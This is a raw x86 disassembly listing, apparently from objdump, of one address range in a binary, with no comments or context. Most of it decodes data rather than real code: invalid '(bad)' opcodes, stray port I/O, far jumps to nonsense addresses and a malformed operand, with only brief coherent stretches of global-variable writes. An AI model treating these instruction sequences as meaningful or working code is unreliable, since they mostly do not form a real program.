  4117d2:	jecxz  0x41176f
  4117d4:	jae    0x411790
  4117d6:	mov    esi,DWORD PTR [ebx+0x26]
  4117d9:	mov    ebx,ds
  4117db:	es jg  0x411797
  4117de:	sti    
  4117df:	adc    bh,BYTE PTR [esi]
  4117e1:	loop   0x411849
  4117e3:	loopne 0x411789
  4117e5:	int3   
  4117e6:	and    al,0xf1
  4117e9:	adc    DWORD PTR [ecx+eax*4+0x6a],ecx
  4117ed:	sti    
  4117ee:	inc    edi
  4117ef:	pushf  
  4117f0:	mov    edi,0x7a23a727
  4117f5:	push   0x120c5e80
  4117fa:	test   BYTE PTR [eax],bh
  4117fc:	jnp    0x411850
  4117fe:	les    ebx,FWORD PTR [ecx]
  411800:	cli    
  411801:	cmp    DWORD PTR [edi],ecx
  411803:	cmp    al,0x5c
  411805:	ror    ebp,0x42
  411808:	sbb    al,bh
  41180a:	js     0x411805
  41180c:	push   ss
  41180d:	packsswb mm1,QWORD PTR [eax+0x47bad25a]
  411814:	cmp    DWORD PTR [ecx+0x14],ecx
  411817:	hlt    
  411818:	pop    ecx
  411819:	mov    al,ds:0xf3f5b1a1
  41181e:	xchg   edx,eax
  41181f:	cmp    eax,0x4dafb3f1
  411824:	inc    ecx
  411825:	cwde   
  411826:	jecxz  0x41184a
  411828:	out    0xad,eax
  41182a:	sbb    ecx,DWORD PTR [edi+0x4766aa71]
  411830:	(bad)  [ebx+edi*4]
  411833:	rcr    BYTE PTR [ecx-0x5b],cl
  411836:	inc    ebp
  411837:	(bad)  
  411838:	push   ebp
  411839:	inc    ecx
  41183a:	adc    DWORD PTR [ebx-0x3dd4f38b],ecx
  411840:	add    DWORD PTR ds:0x42fdf5,0x7f3f
  41184a:	xor    eax,ecx
  41184c:	mov    DWORD PTR ds:0x42fe7a,0x5771
  411856:	cmp    eax,esi
  411858:	mov    DWORD PTR ds:0x42fe76,0x752
  411862:	jne    0x411c7d
  411868:	jmp    0x411c6d
  41186d:	js     0x411844
  41186f:	stos   BYTE PTR es:[edi],al
  411870:	loopne 0x4118db
  411872:	jae    0x4118b6
  411874:	cmc    
  411875:	pop    esi
  411876:	sub    BYTE PTR [ecx+0x3b512ce9],dl
  41187c:	loop   0x4118f4
  41187e:	push   edi
  41187f:	jo     0x4118f1
  411881:	pop    eax
  411882:	jge    0x4118f4
  411884:	jo     0x41180f
  411886:	jecxz  0x411818
  411888:	shl    BYTE PTR [esi],cl
  41188a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41188b:	popf   
  41188c:	mov    dl,0x36
  41188e:	mov    esi,0x36609081
  411893:	pop    edi
  411894:	jae    0x411892
  411896:	mov    bl,0x3b
  411898:	jge    0x4118f5
  41189a:	out    dx,eax
  41189b:	(bad)  
  41189c:	push   edi
  41189d:	cmp    eax,0x45091e8f
  4118a2:	push   edi
  4118a3:	dec    esi
  4118a4:	or     DWORD PTR [ebx+0x2c],esi
  4118a7:	aad    0xaa
  4118a9:	lock cmc 
  4118ab:	jecxz  0x41186f
  4118ad:	nop
  4118ae:	mov    edi,ss
  4118b0:	add    esi,DWORD PTR [edx-0x50]
  4118b3:	loopne 0x4118a5
  4118b5:	rol    DWORD PTR [esi-0x1edaf16a],1
  4118bb:	popa   
  4118bc:	or     BYTE PTR [edi],0x31
  4118bf:	mov    ds:0x1ac93248,eax
  4118c4:	adc    al,0xf
  4118c6:	adc    eax,0x5d304510
  4118cb:	arpl   WORD PTR [esi+0x1f],bx
  4118ce:	xchg   BYTE PTR [edi],bh
  4118d0:	add    eax,0x567e873
  4118d5:	mov    edi,0x572dbeed
  4118da:	fwait
  4118db:	shr    DWORD PTR [edi+eax*1-0x49],0xf9
  4118e0:	in     eax,dx
  4118e1:	and    BYTE PTR [ecx],cl
  4118e3:	or     al,0x84
  4118e5:	pop    ss
  4118e6:	adc    cl,cl
  4118e8:	pop    ebp
  4118e9:	aas    
  4118ea:	xor    edi,DWORD PTR [ecx]
  4118ec:	fcom   st(5)
  4118ee:	mov    dl,BYTE PTR [ebp-0x6f]
  4118f1:	dec    esp
  4118f2:	retf   
  4118f3:	imul   edi,DWORD PTR [eax+0x51],0x69
  4118f7:	lods   al,BYTE PTR ds:[esi]
  4118f8:	or     eax,0x43f5c91b
  4118fd:	in     al,dx
  4118fe:	xchg   esp,eax
  4118ff:	sub    eax,0x15c0c2ce
  411904:	dec    eax
  411905:	mov    ch,0xed
  411907:	dec    esi
  411908:	shl    BYTE PTR [edi-0x1e],cl
  41190b:	sbb    ah,bl
  41190d:	jnp    0x411964
  41190f:	jnp    0x411932
  411911:	pop    edx
  411912:	in     al,0x17
  411914:	mov    ds:0x538e2868,al
  411919:	jp     0x41197b
  41191b:	test   eax,0xbe9c94e
  411920:	(bad)  
  411921:	out    dx,eax
  411922:	in     eax,dx
  411923:	fdivr  st,st(7)
  411925:	(bad)  [ebp-0x5decc08d]
  41192b:	push   0x17
  41192d:	inc    edx
  41192e:	mov    bl,0x4f
  411930:	repnz aaa 
  411932:	xchg   esp,eax
  411933:	xchg   edx,eax
  411934:	aas    
  411935:	push   edx
  411936:	int    0xe1
  411938:	nop
  411939:	xchg   ecx,eax
  41193a:	cmp    dl,ah
  41193c:	inc    eax
  41193d:	mov    ecx,0x3924040f
  411942:	mov    ebp,0x514c73df
  411947:	jp     0x411986
  411949:	mov    ecx,0xf81a8e90
  41194e:	repz xor al,0xe1
  411951:	sti    
  411952:	cs es cmc 
  411955:	or     ah,BYTE PTR [edx-0x2b3b8edc]
  41195b:	mov    ds:0x1abbd22d,eax
  411960:	xor    BYTE PTR [ebp-0x69],dl
  411963:	fwait
  411964:	mov    bh,0x4d
  411966:	mov    WORD PTR [esi+0x6316b08d],es
  41196c:	scas   al,BYTE PTR es:[edi]
  41196d:	in     al,dx
  41196e:	jnp    0x4119a1
  411970:	jg     0x4119c2
  411972:	lods   al,BYTE PTR ds:[esi]
  411973:	jo     0x411988
  411975:	das    
  411976:	ss xchg edi,eax
  411978:	and    DWORD PTR [eax-0x31d49586],eax
  41197e:	scas   al,BYTE PTR es:[edi]
  41197f:	jmp    0x411935
  411981:	dec    edi
  411982:	(bad)  
  411983:	cwde   
  411984:	rcl    edx,0xe4
  411987:	into   
  411988:	call   0xf49d9ef1
  41198d:	(bad)  
  41198f:	test   BYTE PTR [eax+0x4e53aa93],bl
  411995:	scas   eax,DWORD PTR es:[edi]
  411996:	xchg   ecx,eax
  411997:	mov    ds:0x2284141a,eax
  41199c:	add    al,0x16
  41199e:	stos   BYTE PTR es:[edi],al
  41199f:	jmp    0xb34f9d6d
  4119a4:	iret   
  4119a5:	(bad)  
  4119a6:	repz scas eax,DWORD PTR es:[edi]
  4119a8:	js     0x4119ea
  4119aa:	in     al,dx
  4119ab:	xchg   ecx,eax
  4119ac:	lods   al,BYTE PTR ds:[esi]
  4119ad:	xor    al,0xf2
  4119af:	js     0x4119cd
  4119b1:	repnz repnz and ah,BYTE PTR [edx+ecx*2+0x74]
  4119b7:	bound  ebx,QWORD PTR [eax+ebp*1+0x60aa3378]
  4119be:	mov    ah,BYTE PTR [ecx+0x72]
  4119c1:	aam    0x5
  4119c3:	xor    eax,0xdc3e54b8
  4119c8:	sti    
  4119c9:	mov    esi,0xecc88dbb
  4119ce:	sub    dh,bh
  4119d0:	push   ds
  4119d1:	cmp    bl,0x63
  4119d4:	out    0x37,eax
  4119d6:	inc    eax
  4119d7:	mov    eax,ds:0xc1026a9d
  4119dc:	lahf   
  4119dd:	add    ch,ch
  4119df:	sub    al,0xf7
  4119e1:	xlat   BYTE PTR ds:[ebx]
  4119e2:	push   ebx
  4119e3:	fisub  DWORD PTR ds:0x7731931e
  4119e9:	popa   
  4119ea:	sbb    al,0x8f
  4119ec:	jge    0x411987
  4119ee:	stos   DWORD PTR es:[edi],eax
  4119ef:	call   DWORD PTR [edx+0x1ddaaa35]
  4119f5:	icebp  
  4119f6:	lds    ebx,FWORD PTR [edx]
  4119f8:	syscall 
  4119fa:	inc    eax
  4119fb:	jnp    0x4119b1
  4119fd:	inc    edx
  4119fe:	nop
  4119ff:	adc    DWORD PTR [esi+edi*1],0x41
  411a03:	inc    edx
  411a04:	push   esp
  411a05:	mov    esi,0x1c40c26e
  411a0a:	pop    edi
  411a0b:	jmp    0x411a1f
  411a0d:	and    eax,0xa1301014
  411a12:	mov    esp,0x9138592c
  411a18:	push   ds
  411a19:	ret    
  411a1a:	push   esp
  411a1b:	scas   eax,DWORD PTR es:[edi]
  411a1c:	inc    ebp
  411a1d:	pop    esp
  411a1e:	fs retf 0x2a99
  411a22:	inc    ebx
  411a23:	popa   
  411a24:	jbe    0x411a5d
  411a26:	xchg   ebx,eax
  411a27:	add    bh,ch
  411a29:	sbb    ah,BYTE PTR [ecx]
  411a2b:	imul   edi,DWORD PTR [edi+eax*1+0xf],0xdc536030
  411a33:	inc    ecx
  411a34:	inc    eax
  411a35:	imul   ebx,eax,0x7
  411a38:	inc    eax
  411a39:	push   es
  411a3a:	lds    ecx,FWORD PTR [edx]
  411a3c:	adc    DWORD PTR [edi+0x7a],esi
  411a3f:	daa    
  411a40:	dec    edi
  411a41:	stc    
  411a42:	sbb    esp,DWORD PTR [esi]
  411a44:	cdq    
  411a45:	jmp    0x411a6d
  411a47:	mov    eax,0xe746fc63
  411a4c:	iret   
  411a4d:	jno    0x411a84
  411a4f:	inc    esp
  411a50:	out    dx,eax
  411a51:	adc    DWORD PTR [ebx+0x12],eax
  411a54:	jnp    0x411a0b
  411a56:	out    0xe9,al
  411a58:	lds    ebp,FWORD PTR [ebp+0x2d3f4dda]
  411a5e:	lds    eax,FWORD PTR [bp+si+0x6d]
  411a62:	jne    0x411a01
  411a64:	lea    ecx,[ecx-0x30ff392d]
  411a6a:	mov    ecx,0x4000255a
  411a6f:	aad    0xb5
  411a71:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411a72:	pushf  
  411a73:	mov    BYTE PTR ds:0xce98f21f,al
  411a79:	mov    cl,0xbc
  411a7b:	adc    eax,0x63
  411a7e:	xchg   edi,eax
  411a7f:	push   0x693fab79
  411a84:	cmp    eax,edi
  411a86:	les    ebx,FWORD PTR [esi]
  411a88:	inc    edi
  411a89:	sub    al,0x9e
  411a8b:	les    esi,FWORD PTR [edi-0x461c67a2]
  411a91:	dec    edi
  411a92:	mov    ah,0xd7
  411a94:	jb     0x411a85
  411a96:	ins    DWORD PTR es:[edi],dx
  411a97:	mov    dl,0xad
  411a99:	or     eax,0x7e7b2f86
  411a9e:	and    DWORD PTR [eax+edi*2+0x3735ef4c],ebx
  411aa5:	adc    edx,DWORD PTR [edi+edx*8-0x73]
  411aa9:	cmp    al,0xd8
  411aab:	pop    edx
  411aac:	or     ecx,DWORD PTR [esi+0x3a]
  411aaf:	pop    eax
  411ab0:	pusha  
  411ab1:	loope  0x411b26
  411ab3:	cs dec ecx
  411ab5:	and    ch,dh
  411ab7:	imul   edx,DWORD PTR [edi+eax*4-0x80],0xd2f618ca
  411abf:	push   ebp
  411ac0:	mov    bl,BYTE PTR [eax]
  411ac2:	pop    ebp
  411ac3:	popf   
  411ac4:	out    dx,al
  411ac5:	pushf  
  411ac6:	cdq    
  411ac7:	jnp    0x411a71
  411ac9:	jae    0x411a55
  411acb:	mov    cl,0xc1
  411acd:	test   BYTE PTR [edi-0x11bf2c12],bh
  411ad3:	(bad)  
  411ad4:	fisubr WORD PTR [edx-0x28]
  411ad7:	lea    edx,[eax+0x20]
  411ada:	add    ebx,DWORD PTR [eax-0x3]
  411add:	sub    ecx,ebx
  411adf:	clc    
  411ae0:	dec    edx
  411ae1:	push   edi
  411ae2:	or     al,0x27
  411ae4:	mov    bh,0x61
  411ae6:	inc    esp
  411ae7:	jg     0x411ac8
  411ae9:	xchg   DWORD PTR [edx-0x713aeac8],ebx
  411aef:	lahf   
  411af0:	xlat   BYTE PTR ds:[ebx]
  411af1:	push   esi
  411af2:	xor    ecx,DWORD PTR [edi+0x1c]
  411af5:	in     al,dx
  411af6:	sub    eax,0x5dfd0d94
  411afb:	hlt    
  411afc:	ins    BYTE PTR es:[edi],dx
  411afd:	call   0x98cf:0xfb97d044
  411b04:	inc    edi
  411b05:	dec    ecx
  411b06:	hlt    
  411b07:	frstor [ebp+0xf]
  411b0a:	inc    edi
  411b0b:	icebp  
  411b0c:	mul    DWORD PTR [ebx+esi*1]
  411b0f:	(bad)  
  411b10:	scas   eax,DWORD PTR es:[edi]
  411b11:	sbb    al,0x3c
  411b13:	cmp    DWORD PTR [edx],ebx
  411b15:	jno    0x411b83
  411b17:	pop    ecx
  411b18:	push   ss
  411b19:	in     eax,0xe6
  411b1b:	pop    es
  411b1c:	(bad)  
  411b1d:	fwait
  411b1e:	push   edx
  411b1f:	jb     0x411ad5
  411b21:	fidivr DWORD PTR [ebx+0x294b4f14]
  411b27:	lahf   
  411b28:	push   esi
  411b29:	sbb    dl,bl
  411b2b:	push   ss
  411b2c:	or     DWORD PTR [ebx],ecx
  411b2e:	in     al,0x93
  411b30:	mov    edi,0x4dd36d0c
  411b35:	test   DWORD PTR [edi+0x3826496d],esi
  411b3b:	xor    ebx,edx
  411b3d:	out    0x3d,al
  411b3f:	or     esp,ebx
  411b41:	es mov dl,0x9e
  411b44:	xchg   ebp,eax
  411b45:	pusha  
  411b46:	aas    
  411b47:	(bad)
  411b4b:	hlt    
  411b4c:	fadd   DWORD PTR [ebx-0x3c4c96b5]
  411b52:	rol    DWORD PTR [eax],0x66
  411b55:	xor    al,0xfe
  411b57:	xchg   ecx,eax
  411b58:	mov    ah,al
  411b5a:	(bad)  
  411b5b:	sahf   
  411b5c:	repnz dec ebp
  411b5e:	loopne 0x411bce
  411b60:	pop    ecx
  411b61:	lods   eax,DWORD PTR ds:[esi]
  411b62:	jbe    0x411b7a
  411b64:	pop    ebp
  411b65:	adc    al,0x9b
  411b67:	xor    al,0x46
  411b69:	ret    0xff50
  411b6c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411b6d:	mov    bl,dl
  411b6f:	lods   eax,DWORD PTR ds:[esi]
  411b70:	adc    al,0xf5
  411b72:	imul   BYTE PTR [esi]
  411b74:	ret    
  411b75:	stos   DWORD PTR es:[edi],eax
  411b76:	push   cs
  411b77:	mov    edx,0x941d3f58
  411b7c:	xchg   ebx,eax
  411b7d:	jb     0x411be6
  411b7f:	mov    al,ds:0x9df2d7c8
  411b84:	and    eax,0x1a4a60f8
  411b89:	dec    eax
  411b8a:	out    dx,eax
  411b8b:	xor    al,0xc9
  411b8d:	jns    0x411b1e
  411b8f:	push   0x72
  411b91:	fstp   QWORD PTR [edx]
  411b93:	inc    ebp
  411b94:	pop    ds
  411b95:	nop
  411b96:	or     eax,0xdb3288f6
  411b9b:	or     al,0x32
  411b9d:	test   BYTE PTR [esi],ch
  411b9f:	js     0x411c0f
  411ba1:	cwde   
  411ba2:	lods   al,BYTE PTR ds:[esi]
  411ba3:	cdq    
  411ba4:	shl    BYTE PTR [eax+0x7c],0xbe
  411ba8:	(bad)  
  411baa:	add    dl,BYTE PTR [eax+ebx*4+0x57]
  411bae:	mov    dh,0xd3
  411bb0:	pop    edi
  411bb1:	out    dx,eax
  411bb2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411bb3:	pop    ebp
  411bb4:	dec    ebx
  411bb5:	jno    0x411bf5
  411bb7:	dec    edi
  411bb8:	je     0x411b75
  411bba:	fsubr  QWORD PTR [eax+eiz*8]
  411bbd:	dec    edx
  411bbe:	pop    ebx
  411bbf:	inc    ebx
  411bc0:	test   eax,0x1d24c5fb
  411bc5:	xchg   ecx,edx
  411bc7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411bc8:	fsubr  DWORD PTR [edx-0x53]
  411bcb:	out    dx,eax
  411bcc:	in     eax,dx
  411bcd:	adc    DWORD PTR [ebx-0x358bc7e3],ebp
  411bd3:	shl    DWORD PTR [ebx+0x901949a],0xbc
  411bda:	push   cs
  411bdb:	das    
  411bdc:	rol    DWORD PTR [edi],cl
  411bde:	xor    al,0x32
  411be0:	mov    eax,DWORD PTR [eax+0x53ea191a]
  411be6:	test   DWORD PTR [edx],esp
  411be8:	jnp    0x411ba2
  411bea:	ret    0x1d71
  411bed:	ret    
  411bee:	mov    esp,0xda21d07c
  411bf3:	xchg   edx,eax
  411bf4:	ss je  0x411c03
  411bf7:	in     eax,dx
  411bf8:	xchg   ebx,eax
  411bf9:	cmp    al,0xc9
  411bfb:	lods   eax,DWORD PTR ds:[esi]
  411bfc:	popf   
  411bfd:	fild   WORD PTR ds:0x1cb70dac
  411c03:	sbb    DWORD PTR [ebx],0x306adca0
  411c09:	jle    0x411c3d
  411c0b:	lock sbb DWORD PTR [edx-0x623d848b],eax
  411c12:	iret   
  411c13:	lock in eax,dx
  411c15:	lock popf 
  411c17:	shr    BYTE PTR [ebx+ecx*4-0x59],cl
  411c1b:	in     al,0x7d
  411c1d:	shl    BYTE PTR [ebp+0x201b3351],0x62
  411c24:	jne    0x411c9a
  411c26:	inc    ecx
  411c27:	(bad)  
  411c29:	lods   eax,DWORD PTR ds:[esi]
  411c2a:	inc    esp
  411c2b:	add    edi,edx
  411c2d:	fist   WORD PTR cs:0x4b2e04ed
  411c34:	pop    esp
  411c35:	into   
  411c36:	enter  0xf4f4,0x93
  411c3a:	addr16 in al,0x27
  411c3d:	mov    ah,0x1c
  411c3f:	leave  
  411c40:	add    eax,0xdc606407
  411c45:	hlt    
  411c46:	ds and eax,0xae3c025
  411c4c:	inc    edx
  411c4d:	xchg   ecx,eax
  411c4e:	clc    
  411c4f:	and    al,0xb8
  411c51:	ds xchg dh,bl
  411c54:	ret    0x9a52
  411c57:	push   esp
  411c58:	fimul  WORD PTR [esp+edi*2]
  411c5b:	cld    
  411c5c:	pusha  
  411c5d:	mov    ?,WORD PTR [ebx-0x1a]
  411c60:	jg     0x411c93
  411c62:	cmc    
  411c63:	push   ecx
  411c64:	xchg   ebp,eax
  411c65:	push   ecx
  411c66:	scas   al,BYTE PTR es:[edi]
  411c67:	shl    DWORD PTR [ebp+0x6e],1
  411c6a:	mov    ebx,0x2ca1bd56
  411c6f:	mov    dl,0x41
  411c71:	add    BYTE PTR [ebx],al
  411c73:	add    eax,0x41b224
  411c78:	jmp    0x411c84
  411c7d:	mov    eax,DWORD PTR [ebp+0xc]
  411c80:	xor    eax,ecx
  411c82:	add    eax,edx
  411c84:	mov    ds:0x41b224,eax
  411c89:	mov    eax,DWORD PTR [ebp+0xc]
  411c8c:	xor    eax,ecx
  411c8e:	add    eax,edx
  411c90:	mov    ds:0x41b22c,eax
  411c95:	jmp    0x4120a9
  411c9a:	mov    eax,ds:0x41b22c
  411c9f:	mov    ds:0x41b224,eax
  411ca4:	jmp    0x4120a9
  411ca9:	mov    dh,0x72
  411cab:	cwde   
  411cac:	test   al,0x64
  411cae:	jb     0x411c66
  411cb0:	jb     0x411ca3
  411cb2:	xchg   ecx,eax
  411cb3:	adc    eax,0xc938f95e
  411cb8:	push   ecx
  411cb9:	pop    esi
  411cba:	push   ebx
  411cbb:	jo     0x411d2d
  411cbd:	pop    eax
  411cbe:	jge    0x411d30
  411cc0:	jo     0x411cac
  411cc2:	(bad)  
  411cc3:	sar    BYTE PTR [esi+eiz*4-0x2e3be668],0x26
  411ccb:	pop    ds
  411ccc:	inc    eax
  411ccd:	pusha  
  411cce:	sbb    BYTE PTR [edx+ebp*1],0xba
  411cd2:	jns    0x411c7f
  411cd4:	push   ebx
  411cd5:	lea    esi,[eax+eiz*2]
  411cd8:	cmp    al,0x3
  411cda:	je     0x411cac
  411cdc:	adc    eax,0x1c39cb61
  411ce1:	mov    esp,0xe0dc1e7a
  411ce6:	loope  0x411d3a
  411ce8:	sbb    bh,BYTE PTR [ecx]
  411cea:	dec    edx
  411ceb:	mov    esi,0xbb377e21
  411cf0:	cmp    edx,DWORD PTR [ebx]
  411cf2:	jnp    0x411cc1
  411cf4:	and    BYTE PTR [ecx],al
  411cf6:	mov    dh,0xb
  411cf8:	push   esi
  411cf9:	adc    bl,BYTE PTR [ebp-0x1607d745]
  411cff:	inc    ecx
  411d00:	sub    dl,dl
  411d02:	cwde   
  411d03:	mov    al,0xb5
  411d05:	jle    0x411d2d
  411d07:	inc    DWORD PTR [edi-0x14]
  411d0a:	pushf  
  411d0b:	jae    0x411ce1
  411d0d:	xchg   ebx,eax
  411d0e:	and    BYTE PTR [esi+0x72737c3c],0x17
  411d15:	jns    0x411d42
  411d17:	test   al,0xdb
  411d19:	inc    ebp
  411d1a:	gs xchg edi,eax
  411d1c:	cmp    DWORD PTR [esi-0x77f5bdb5],edi
  411d22:	daa    
  411d23:	adc    al,0x5c
  411d25:	mov    edi,0x545ca104
  411d2a:	cmp    esi,DWORD PTR [edx+ebx*2]
  411d2d:	mov    ds,WORD PTR [ecx-0x564ed55f]
  411d33:	retf   0x1c6a
  411d36:	adc    ebx,ecx
  411d38:	adc    dh,BYTE PTR ds:0xede77621
  411d3e:	rcr    BYTE PTR [ebx+0x2d775b42],0xc1
  411d45:	sbb    al,0xb8
  411d47:	mov    ds:0xc31b210a,eax
  411d4c:	sbb    al,0xd
  411d4e:	pop    ecx
  411d4f:	sahf   
  411d50:	xchg   esp,eax
  411d51:	into   
  411d52:	adc    al,0xa
  411d54:	gs push es
  411d56:	inc    edx
  411d57:	mov    dh,0x13
  411d59:	call   0xee36af84
  411d5e:	or     BYTE PTR [esi],dl
  411d60:	pop    ebp
  411d61:	jmp    0x411d35
  411d63:	xchg   esi,eax
  411d64:	and    al,0xf0
  411d66:	xor    al,BYTE PTR [esi+0x19]
  411d69:	add    al,0x4e
  411d6b:	pop    ebp
  411d6c:	fcmovne st,st(7)
  411d6e:	mov    eax,0x516fc0b4
  411d73:	add    eax,0xf7c15c25
  411d78:	shr    esi,1
  411d7a:	shr    al,1
  411d7c:	xor    esi,DWORD PTR [ebp-0x2f9e31d3]
  411d82:	push   edi
  411d83:	out    0x32,eax
  411d85:	or     dl,cl
  411d87:	and    ah,BYTE PTR [ebx-0x73fd9231]
  411d8d:	int3   
  411d8e:	jg     0x411df6
  411d90:	std    
  411d91:	cmp    al,0x70
  411d93:	(bad)  
  411d94:	daa    
  411d95:	leave  
  411d96:	jle    0x411d98
  411d98:	into   
  411d99:	jnp    0x411d46
  411d9b:	call   0xc9f5:0x9545f537
  411da2:	or     ch,ch
  411da4:	mov    ds:0xdd7e2577,eax
  411da9:	xchg   esp,eax
  411daa:	push   ecx
  411dab:	in     al,0x9e
  411dad:	pop    ebp
  411dae:	lea    ebp,ds:0x40c51278
  411db4:	pop    ebp
  411db5:	xor    edx,DWORD PTR [esi]
  411db7:	fucomp st(3)
  411db9:	in     eax,dx
  411dba:	inc    eax
  411dbb:	rcr    bl,0x24
  411dbe:	sub    al,0xd7
  411dc0:	fwait
  411dc1:	and    ecx,DWORD PTR [edx]
  411dc3:	sar    ecx,0x2e
  411dc6:	mov    eax,ds:0x2b1a7047
  411dcb:	add    ch,al
  411dcd:	into   
  411dce:	xchg   ebp,eax
  411dcf:	pop    ss
  411dd0:	inc    esi
  411dd1:	call   0x3fe0c9bf
  411dd6:	aam    0xd1
  411dd8:	pop    DWORD PTR [ebp-0x80]
  411ddb:	push   ebx
  411ddc:	les    ecx,FWORD PTR [esi-0x6c]
  411ddf:	pop    ds
  411de0:	or     eax,0xbf788b36
  411de5:	fsubrp st(6),st
  411de7:	xor    esp,ebp
  411de9:	sbb    DWORD PTR [eax+0x446b34eb],ebp
  411def:	and    eax,0xd314b16e
  411df4:	xchg   esp,eax
  411df5:	or     DWORD PTR [ebp+0x6b],edi
  411df8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411df9:	and    ecx,DWORD PTR [ebp-0x1f181247]
  411dff:	in     al,0xa
  411e01:	xor    DWORD PTR [ebp-0x4bbd97cb],0xffffffd5
  411e08:	ficomp WORD PTR [edi+0x6e]
  411e0b:	std    
  411e0c:	setl   BYTE PTR [edi-0x61]
  411e10:	sbb    al,0x86
  411e12:	jp     0x411e27
  411e14:	add    dh,ah
  411e16:	or     eax,0x59c8cd42
  411e1b:	pop    ecx
  411e1c:	mov    ecx,0x475b8b78
  411e21:	test   al,0xad
  411e23:	pop    edx
  411e24:	lock mov al,0x4c
  411e27:	xor    eax,0x5713f779
  411e2c:	hlt    
  411e2d:	mov    edi,0x1b4dc515
  411e32:	popf   
  411e33:	addr16 add al,0x6
  411e36:	test   DWORD PTR [eax],esp
  411e38:	int    0x67
  411e3a:	repz inc ecx
  411e3c:	mov    ah,0xc3
  411e3e:	mov    BYTE PTR ds:0x27b93040,bh
  411e44:	ja     0x411e8b
  411e46:	pop    ebp
  411e47:	inc    eax
  411e48:	repnz xor BYTE PTR [ebp+0x554e7cf6],0x51
  411e50:	mov    al,ds:0x96ed9c7a
  411e55:	adc    al,0xd4
  411e57:	add    BYTE PTR [esi+0x26],bh
  411e5a:	cs mov ecx,0xc2666ef0
  411e60:	cmp    al,0xb
  411e62:	mov    eax,ds:0x979a1e10
  411e67:	mov    BYTE PTR [edi-0x6a],dh
  411e6a:	cmp    BYTE PTR [ecx],dl
  411e6c:	mov    ecx,0x9e85830a
  411e71:	add    dh,BYTE PTR [edx]
  411e73:	retf   0xebc4
  411e76:	(bad)
  411e7b:	mov    ds:0x12e04b4c,al
  411e80:	inc    ebx
  411e81:	sub    BYTE PTR es:[ebx-0x77],ch
  411e85:	gs out 0xbd,al
  411e88:	mov    esp,DWORD PTR cs:[esi*1+0x38d14719]
  411e90:	add    cl,0x39
  411e93:	mov    edi,0x293fa972
  411e98:	sahf   
  411e99:	mov    ebp,DWORD PTR [ebp-0x47]
  411e9c:	cmp    cl,ch
  411e9e:	nop
  411e9f:	or     DWORD PTR [eax+0x13],ebx
  411ea2:	sbb    eax,0x520e9469
  411ea7:	rol    DWORD PTR [edi+0x5b72f16b],0xf9
  411eae:	jb     0x411f27
  411eb0:	jge    0x411eff
  411eb2:	push   ebx
  411eb3:	xor    BYTE PTR [ebx],dh
  411eb5:	lahf   
  411eb6:	cmp    eax,0xe1e2644c
  411ebb:	xor    DWORD PTR [eax-0xe],ebx
  411ebe:	cmp    al,0x6a
  411ec0:	inc    ebx
  411ec1:	mov    edx,0x569c8936
  411ec6:	sbb    dl,0x5d
  411ec9:	jmp    0xda95:0x3afc5f12
  411ed0:	add    al,0x5b
  411ed2:	outs   dx,BYTE PTR ds:[esi]
  411ed3:	retf   
  411ed4:	jl     0x411f3f
  411ed6:	xchg   edx,eax
  411ed7:	jmp    0xd1e95514
  411edc:	xor    BYTE PTR [ecx+0x1f3e5635],dh
  411ee2:	mov    gs,WORD PTR [ebx+0x6b]
  411ee5:	out    0x1,eax
  411ee7:	stc    
  411ee8:	in     al,dx
  411ee9:	lods   al,BYTE PTR ds:[esi]
  411eea:	push   es
  411eeb:	push   ss
  411eec:	sbb    BYTE PTR [eax+0x54],cl
  411eef:	arpl   WORD PTR [edi],dx
  411ef1:	idiv   BYTE PTR [ebx]
  411ef3:	pop    edx
  411ef4:	gs lock jb 0x411f26
  411ef8:	call   0xc18d:0x7a46fbdb
  411eff:	shl    edi,1
  411f01:	inc    esp
  411f02:	jb     0x411f26
  411f04:	out    dx,al
  411f05:	ss mov ch,0xea
  411f08:	xor    al,0x5c
  411f0a:	imul   edx,DWORD PTR [esi+0x1a],0x973d76bc
  411f11:	lock mov esp,DWORD PTR [esi]
  411f14:	cmp    BYTE PTR [ecx],bl
  411f16:	sbb    eax,0x7f965a9e
  411f1b:	mov    ecx,0x662b4be2
  411f20:	xor    DWORD PTR [ebp-0x39],ebp
  411f23:	in     al,dx
  411f24:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411f25:	mov    ebx,0x483726e0
  411f2a:	jae    0x411ef6
  411f2c:	out    0xb2,al
  411f2e:	jno    0x411f91
  411f30:	gs jns 0x411f37
  411f33:	mov    bh,0xd7
  411f35:	pop    esp
  411f36:	sub    DWORD PTR [ecx-0x2d24269f],eax
  411f3c:	ficom  WORD PTR [ebx-0x16]
  411f3f:	push   edx
  411f40:	data16 mov dh,0x85
  411f43:	ret    0x9e7
  411f46:	jae    0x411f62
  411f48:	mov    ch,BYTE PTR [eax]
  411f4a:	(bad)  
  411f4c:	jnp    0x411eff
  411f4e:	(bad)  
  411f50:	sbb    dl,dl
  411f52:	mov    DWORD PTR [eax+0x14ca996b],esi
  411f58:	mov    esp,fs
  411f5a:	adc    BYTE PTR [edi+0x30],ah
  411f5d:	test   eax,0x1368da27
  411f62:	test   al,0xc1
  411f64:	popf   
  411f65:	scas   eax,DWORD PTR es:[edi]
  411f66:	loop   0x411eec
  411f68:	lahf   
  411f69:	dec    ecx
  411f6a:	jo     0x411fbb
  411f6c:	loope  0x411f6f
  411f6e:	xchg   edi,eax
  411f6f:	out    dx,al
  411f70:	push   ebx
  411f72:	fstp   DWORD PTR [ebp-0x3c6f9335]
  411f78:	pop    ds
  411f79:	sbb    eax,0xc57cd78d
  411f7e:	rcr    DWORD PTR ds:0x5b9e8609,1
  411f84:	push   edi
  411f85:	in     eax,dx
  411f86:	or     eax,0xfaa4dd7
  411f8b:	mov    ds:0x37e6288e,eax
  411f90:	jmp    0x309f:0xf31514f3
  411f97:	fisub  WORD PTR [edi]
  411f99:	sub    eax,0xdf300779
  411f9e:	(bad)  
  411f9f:	cmp    DWORD PTR [ebx+edx*2],esi
  411fa2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411fa3:	adc    dl,ah
  411fa5:	mov    edi,0x41c7e81d
  411faa:	inc    eax
  411fab:	sub    BYTE PTR [edi-0x3178fbd9],0x2a
  411fb2:	pop    edi
  411fb3:	cmc    
  411fb4:	sub    al,0xd2
